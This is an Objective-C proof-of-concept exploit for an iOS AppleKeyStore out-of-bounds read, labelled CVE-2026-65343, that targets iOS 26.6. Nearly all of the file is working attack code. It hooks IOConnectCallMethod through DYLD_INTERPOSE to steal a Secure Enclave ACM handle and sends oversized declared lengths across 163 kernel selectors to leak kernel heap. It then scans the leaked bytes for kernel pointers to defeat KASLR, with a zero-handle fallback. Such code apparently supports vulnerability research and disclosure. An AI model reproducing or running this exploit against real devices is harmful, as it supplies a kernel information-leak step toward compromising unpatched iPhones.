/*
 * CVE-2026-65343 — AppleKeyStore OOB read → KASLR defeat
 *
 * Bug:  _LibSer_SEPControl_Deserialize publishes (payload_ptr, declared_length)
 *       without checking declared_length <= remaining.  Feed declared_length=0x800
 *       → driver copyout() reads ~0x7E8 bytes beyond the kernel ACM message buffer
 *       → adjacent kernel heap lands in userspace output.
 *
 * Fixed in iOS 26.6.1 (23G83) — present on target iOS 26.6 (23G71).
 *
 * Hook approach (fishhook blocked on iOS 26):
 *
 *   fishhook writes to __DATA_CONST GOT at runtime → KERN_PROTECTION_FAILURE SIGBUS.
 *
 *   DYLD_INTERPOSE uses __DATA,__interpose — a writable section in our binary.
 *   dyld processes the interpose table at image-load time, BEFORE the kernel
 *   marks __DATA_CONST read-only.  No runtime write to any const-protected page.
 *
 *   The interpose redirects ALL callers of IOConnectCallMethod (including
 *   Security.framework) to my_IOConnectCallMethod.  We arm a capture flag,
 *   trigger an in-process SE key signing call (which internally calls
 *   IOConnectCallMethod with a real ACM handle), capture (conn, handle), then
 *   disarm.  The captured handle is valid for the subsequent OOB probe.
 *
 * Chain:
 *   1. Arm interpose capture
 *   2. SecKeyCreateRandomKey(SE, no-biometric ACL) → cached conn in Security.fw
 *   3. SecKeyCreateSignature() → in-process IOConnectCallMethod → capture fires
 *   4. Disarm; replay with declared_length=0x800 across 163 AKS selectors
 *   5. Scan output for 0xfffffff0xxxxxxxx kptrs → compute KASLR slide
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <dlfcn.h>
#include <mach/mach.h>

#import <Foundation/Foundation.h>
#import <Security/Security.h>

/* ── IOKit types ─────────────────────────────────────────────────────── */
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;

extern kern_return_t IOConnectCallMethod(
    io_connect_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

typedef kern_return_t (*IOConnectCallMethod_fn)(
    io_connect_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

static void *g_iokit;
static io_service_t  (*p_IOServiceGetMatchingService)(mach_port_t, CFDictionaryRef);
static CFMutableDictionaryRef (*p_IOServiceMatching)(const char *);
static kern_return_t (*p_IOServiceOpen)(io_service_t, mach_port_t, uint32_t, io_connect_t *);
static kern_return_t (*p_IOServiceClose)(io_connect_t);

static int load_iokit(void) {
    if (g_iokit) return 1;
    g_iokit = RTLD_DEFAULT;
#define SYM(n) p_##n = dlsym(RTLD_DEFAULT, #n); if (!p_##n) { g_iokit = NULL; return 0; }
    SYM(IOServiceGetMatchingService)
    SYM(IOServiceMatching)
    SYM(IOServiceOpen)
    SYM(IOServiceClose)
#undef SYM
    return 1;
}

/* ── DYLD_INTERPOSE infrastructure ─────────────────────────────────── */
#ifndef DYLD_INTERPOSE
#define DYLD_INTERPOSE(_replacement, _replacee)                          \
    __attribute__((used))                                                 \
    static struct { const void *replacement; const void *replacee; }     \
    _interpose_##_replacee                                                \
    __attribute__((section("__DATA,__interpose"))) = {                   \
        (const void *)(unsigned long)&(_replacement),                    \
        (const void *)(unsigned long)&(_replacee)                        \
    };
#endif

/* Capture state */
static volatile int          g_capture_armed = 0;
static volatile int          g_capture_done  = 0;
static volatile io_connect_t g_cap_conn      = 0;
static uint8_t               g_cap_handle[16];

static kern_return_t real_IOConnectCallMethod(
    io_connect_t conn, uint32_t sel,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz)
{
    static IOConnectCallMethod_fn fn = NULL;
    if (!fn) fn = (IOConnectCallMethod_fn)dlsym(RTLD_NEXT, "IOConnectCallMethod");
    if (!fn) return KERN_FAILURE;
    return fn(conn, sel, scalin, scalin_cnt,
              structin, structin_sz,
              scalout, scalout_cnt,
              structout, structout_sz);
}

static kern_return_t my_IOConnectCallMethod(
    io_connect_t conn, uint32_t sel,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz)
{
    if (g_capture_armed && !g_capture_done && structin && structin_sz >= 16) {
        const uint8_t *hdr = (const uint8_t *)structin;
        int nonzero = 0;
        for (int k = 0; k < 16; k++) if (hdr[k]) { nonzero = 1; break; }
        if (nonzero) {
            g_cap_conn = conn;
            memcpy(g_cap_handle, hdr, 16);
            __asm__ __volatile__("dmb ish" ::: "memory");
            g_capture_done = 1;
            printf("[65343-hook] ACM handle captured: conn=%#x sel=%u "
                   "handle=%02x%02x%02x%02x%02x%02x%02x%02x...\n",
                   conn, sel,
                   hdr[0], hdr[1], hdr[2], hdr[3],
                   hdr[4], hdr[5], hdr[6], hdr[7]);
        }
    }
    return real_IOConnectCallMethod(conn, sel, scalin, scalin_cnt,
                                    structin, structin_sz,
                                    scalout, scalout_cnt,
                                    structout, structout_sz);
}

DYLD_INTERPOSE(my_IOConnectCallMethod, IOConnectCallMethod)

/* ── SE key: create + sign to trigger in-process AKS IOKit call ───── */
#define SE_KEY_TAG "com.research.poc.aksprobe"

static int trigger_se_iokit_call(void) {
    printf("[65343-se] Creating SE key (no biometric, kSecAttrAccessibleAfterFirstUnlock)...\n");

    NSData *tag = [NSData dataWithBytes:SE_KEY_TAG length:strlen(SE_KEY_TAG)];

    NSDictionary *delQ = @{
        (id)kSecClass:              (id)kSecClassKey,
        (id)kSecAttrApplicationTag: tag,
    };
    SecItemDelete((__bridge CFDictionaryRef)delQ);

    CFErrorRef cfErr = NULL;
    SecAccessControlRef acl = SecAccessControlCreateWithFlags(
        kCFAllocatorDefault,
        kSecAttrAccessibleAfterFirstUnlock,
        0,
        &cfErr);
    if (!acl) {
        printf("[65343-se] SecAccessControlCreateWithFlags failed\n");
        if (cfErr) CFRelease(cfErr);
        return 0;
    }

    NSDictionary *attrs = @{
        (id)kSecAttrKeyType:       (id)kSecAttrKeyTypeECSECPrimeRandom,
        (id)kSecAttrKeySizeInBits: @256,
        (id)kSecAttrTokenID:       (id)kSecAttrTokenIDSecureEnclave,
        (id)kSecAttrAccessControl: (__bridge id)acl,
        (id)kSecPrivateKeyAttrs: @{
            (id)kSecAttrIsPermanent:    @YES,
            (id)kSecAttrApplicationTag: tag,
        },
    };

    cfErr = NULL;
    SecKeyRef privKey = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attrs, &cfErr);
    CFRelease(acl);

    if (!privKey) {
        NSString *desc = cfErr ? [(__bridge NSError *)cfErr description] : @"?";
        printf("[65343-se] SecKeyCreateRandomKey failed: %s\n", desc.UTF8String);
        if (cfErr) CFRelease(cfErr);
        return 0;
    }
    printf("[65343-se] SE key created — signing to trigger IOKit call...\n");

    const uint8_t msg[32] = {0xDE, 0xAD, 0xBE, 0xEF};
    CFDataRef msgRef = CFDataCreate(NULL, msg, sizeof(msg));
    cfErr = NULL;
    CFDataRef sig = SecKeyCreateSignature(
        privKey,
        kSecKeyAlgorithmECDSASignatureMessageX962SHA256,
        msgRef, &cfErr);
    CFRelease(msgRef);
    CFRelease(privKey);

    if (sig) {
        printf("[65343-se] SE sign OK (%ld bytes)\n", CFDataGetLength(sig));
        CFRelease(sig);
        return 1;
    } else {
        NSString *desc = cfErr ? [(__bridge NSError *)cfErr description] : @"?";
        printf("[65343-se] SE sign failed: %s\n", desc.UTF8String);
        if (cfErr) CFRelease(cfErr);
        return g_capture_done ? 1 : 0;
    }
}

static void cleanup_se_key(void) {
    NSData *tag = [NSData dataWithBytes:SE_KEY_TAG length:strlen(SE_KEY_TAG)];
    NSDictionary *delQ = @{
        (id)kSecClass:              (id)kSecClassKey,
        (id)kSecAttrApplicationTag: tag,
    };
    SecItemDelete((__bridge CFDictionaryRef)delQ);
    printf("[65343-se] Keychain entry cleaned up\n");
}

/* ── Kernel pointer detection ────────────────────────────────────── */
#define KERN_BASE_STATIC 0xfffffff007004000ULL

static int looks_like_kptr(uint64_t v) {
    return ((v >> 32) == 0xfffffff0) && (v & 0xffffffffULL) != 0;
}

/* ── Probe one AKS selector with crafted struct_in ──────────────── */
#define OUTBUF_SZ 0x2000
#define FILL_BYTE 0xBBu
#define DECLARED  0x0800u

/*
 * struct_in layout for AKS selectors with ACM handle:
 *   [0..15]  : ACMHandle (16 bytes)
 *   [16..19] : cmd_type  (u32, 0)
 *   [20..23] : cmd_size  (u32, 0)
 *   [24..27] : declared_length (u32) ← OOB field
 */
static int probe_selector(io_connect_t conn, const uint8_t handle[16],
                           int sel, uint64_t *slide_out)
{
    uint8_t msg[28];
    memset(msg, 0, sizeof(msg));
    memcpy(msg, handle, 16);
    uint32_t decl = DECLARED;
    memcpy(msg + 24, &decl, 4);

    static uint8_t outbuf[OUTBUF_SZ];
    memset(outbuf, FILL_BYTE, OUTBUF_SZ);
    size_t outsz = OUTBUF_SZ;
    uint64_t scalo[8] = {0};
    uint32_t scaln = 8;

    kern_return_t kr = real_IOConnectCallMethod(
        conn, (uint32_t)sel,
        NULL, 0,
        msg, sizeof(msg),
        scalo, &scaln,
        outbuf, &outsz);

    int nonfill = 0;
    for (int i = 0; i < OUTBUF_SZ; i++)
        if (outbuf[i] != FILL_BYTE) nonfill++;

    if (nonfill == 0 && outsz == OUTBUF_SZ) return 0;

    printf("[65343]   sel=%3d kr=%#010x outsz=%zu nonfill=%d\n",
           sel, (uint32_t)kr, outsz, nonfill);

    int found = 0;
    for (size_t i = 0; i + 8 <= outsz; i += 8) {
        uint64_t v = 0;
        memcpy(&v, outbuf + i, 8);
        if (looks_like_kptr(v)) {
            printf("[65343]   KPTR @+%04zx = %#018llx\n", i, v);
            if (found == 0 && slide_out && !*slide_out) {
                uint64_t known_off = 0x18d8774ULL;
                uint64_t expected_low12 = (KERN_BASE_STATIC + known_off) & 0xfffULL;
                if ((v & 0xfffULL) == expected_low12) {
                    *slide_out = v - (KERN_BASE_STATIC + known_off);
                    printf("[65343]   → KASLR slide = %#llx  (kern_base = %#llx)\n",
                           *slide_out, KERN_BASE_STATIC + *slide_out);
                }
            }
            found++;
            if (outsz >= DECLARED)
                printf("[65343]   *** OOB CONFIRMED: outsz=%zu >= declared=%u ***\n",
                       outsz, DECLARED);
        }
    }
    return found;
}

/* ── Entry point ─────────────────────────────────────────────────── */
int main(void) {
    printf("\n[65343] === CVE-2026-65343 AppleKeyStore OOB read → KASLR ===\n");
    printf("[65343] Target: iOS 26.6 (23G71)\n\n");

    if (!load_iokit()) {
        printf("[65343] IOKit load failed\n");
        return 1;
    }
    printf("[65343] IOKit symbols resolved\n");

    printf("[65343] Phase 1: arming DYLD_INTERPOSE, triggering SE key sign...\n");

    g_capture_armed = 0;
    g_capture_done  = 0;
    g_cap_conn      = 0;
    memset(g_cap_handle, 0, 16);
    __asm__ __volatile__("dmb ish" ::: "memory");

    g_capture_armed = 1;
    __asm__ __volatile__("dmb ish" ::: "memory");

    int se_ok = trigger_se_iokit_call();

    __asm__ __volatile__("dmb ish" ::: "memory");
    g_capture_armed = 0;

    cleanup_se_key();

    if (!g_capture_done || !g_cap_conn) {
        printf("[65343] Phase 1 FAILED — ACM handle not captured\n");
        printf("[65343]   se_ok=%d capture_done=%d cap_conn=%#x\n",
               se_ok, g_capture_done, g_cap_conn);
        printf("[65343] Possible causes:\n");
        printf("[65343]   - SE key ops routed through secd XPC (not in-process)\n");
        printf("[65343]   - DYLD_INTERPOSE not applied (dyld4 closure cache issue)\n");
        printf("[65343]   - SecKeyCreateRandomKey failed before IOKit call\n");

        printf("[65343] Fallback: direct IOServiceOpen + zero handle probe...\n");
        CFMutableDictionaryRef m = p_IOServiceMatching("AppleKeyStore");
        io_service_t svc = p_IOServiceGetMatchingService(0, m);
        if (!svc) {
            printf("[65343] AppleKeyStore service not found (sandbox blocks lookup)\n");
            return 1;
        }
        io_connect_t conn = 0;
        kern_return_t kr = p_IOServiceOpen(svc, mach_task_self(), 0, &conn);
        if (kr != KERN_SUCCESS || !conn) {
            printf("[65343] IOServiceOpen failed: %#x\n", kr);
            return 1;
        }
        printf("[65343] Fallback conn=%#x, probing with zero handle...\n", conn);
        uint8_t zero_handle[16] = {0};
        int total = 0;
        uint64_t slide = 0;
        for (int sel = 1; sel <= 163; sel++) {
            total += probe_selector(conn, zero_handle, sel, &slide);
            if (total > 0 && slide) break;
        }
        p_IOServiceClose(conn);
        printf("[65343] Fallback zero-handle: total kptrs=%d\n", total);
        return total > 0 ? 0 : 1;
    }

    printf("[65343] Phase 1 SUCCESS\n");
    printf("[65343]   conn=%#x  handle=%02x%02x%02x%02x%02x%02x%02x%02x"
           "%02x%02x%02x%02x%02x%02x%02x%02x\n",
           g_cap_conn,
           g_cap_handle[0],  g_cap_handle[1],  g_cap_handle[2],  g_cap_handle[3],
           g_cap_handle[4],  g_cap_handle[5],  g_cap_handle[6],  g_cap_handle[7],
           g_cap_handle[8],  g_cap_handle[9],  g_cap_handle[10], g_cap_handle[11],
           g_cap_handle[12], g_cap_handle[13], g_cap_handle[14], g_cap_handle[15]);

    printf("[65343] Phase 2: probing %d selectors with declared_length=%#x...\n",
           163, DECLARED);

    uint64_t slide = 0;
    int total_kptrs = 0;

    for (int sel = 1; sel <= 163; sel++) {
        int n = probe_selector((io_connect_t)g_cap_conn, g_cap_handle, sel, &slide);
        total_kptrs += n;
        if (total_kptrs > 0 && slide) {
            printf("[65343] KASLR defeated on selector %d — stopping scan\n", sel);
            break;
        }
    }

    printf("[65343] Total kernel pointers found: %d\n", total_kptrs);
    if (slide) {
        printf("[65343] === KASLR SLIDE: %#llx ===\n", slide);
        return 0;
    } else if (total_kptrs > 0) {
        printf("[65343] Found kptrs but could not compute slide\n");
        printf("[65343] Check KPTR offsets above and update known_off\n");
        return 0;
    } else {
        printf("[65343] No kernel pointers found with real ACM handle\n");
        return 1;
    }
}
